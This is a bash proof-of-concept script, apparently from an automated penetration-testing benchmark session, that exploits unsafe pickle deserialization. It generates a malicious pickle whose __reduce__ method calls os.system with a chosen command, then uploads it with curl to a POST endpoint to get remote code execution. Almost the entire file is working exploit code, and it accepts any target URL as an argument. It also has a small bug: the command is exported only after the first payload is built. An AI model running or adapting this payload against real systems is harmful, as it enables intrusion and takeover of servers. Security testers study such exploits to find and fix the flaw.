#!/bin/bash
# POC: Demonstrates Remote Code Execution via unsafe pickle deserialization on POST / endpoint by uploading a malicious pickle payload that executes arbitrary commands
# Target: ./repo
# Created: 2025-11-10T15:08:06.306Z
# Session: benchmark-XBEN-036-24-mht9l3st

# Pickle RCE Vulnerability POC
# This script demonstrates RCE via unsafe pickle deserialization
# Target: POST / endpoint with pickle_file parameter

TARGET_URL="${1:-http://localhost:8080/}"
COMMAND="${2:-id}"

echo "[*] Pickle RCE Exploitation POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Command to execute: $COMMAND"
echo ""

# Create a temporary directory for our payloads
TMPDIR=$(mktemp -d)
trap "rm -rf $TMPDIR" EXIT

# Generate malicious pickle payload using Python
# This uses the __reduce__ method to execute arbitrary code
python3 << 'PYTHON_EOF' > "$TMPDIR/payload.pickle"
import pickle
import os
import sys

# Read command from environment
command = os.environ.get('RCE_COMMAND', 'id')

# Create a malicious pickle object using __reduce__
class RCEPayload:
    def __reduce__(self):
        # __reduce__ returns (callable, args)
        # When unpickling, Python will call: callable(*args)
        # We use os.system to execute arbitrary commands
        return (os.system, (command,))

# Create and serialize the malicious object
payload = RCEPayload()
pickle.dump(payload, sys.stdout.buffer)
PYTHON_EOF

# Set command in environment for Python script
export RCE_COMMAND="$COMMAND"

# Re-run if the export didn't work
if [ ! -s "$TMPDIR/payload.pickle" ]; then
    python3 << PYTHON_EOF > "$TMPDIR/payload.pickle"
import pickle
import os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ("$COMMAND",))

payload = RCEPayload()
pickle.dump(payload, open('/dev/stdout', 'wb'))
PYTHON_EOF
fi

echo "[*] Payload generated at: $TMPDIR/payload.pickle"
echo "[*] Payload size: $(stat -f%z "$TMPDIR/payload.pickle" 2>/dev/null || stat -c%s "$TMPDIR/payload.pickle" 2>/dev/null) bytes"
echo ""

# Send the malicious pickle file to the target
echo "[*] Sending malicious pickle payload to $TARGET_URL..."
echo ""

curl -v -X POST "$TARGET_URL" \
  -F "pickle_file=@$TMPDIR/payload.pickle" \
  2>&1 | tee "$TMPDIR/response.txt"

echo ""
echo "[*] POC execution completed"
echo "[*] If the command executed successfully on the server, this is a confirmed RCE vulnerability"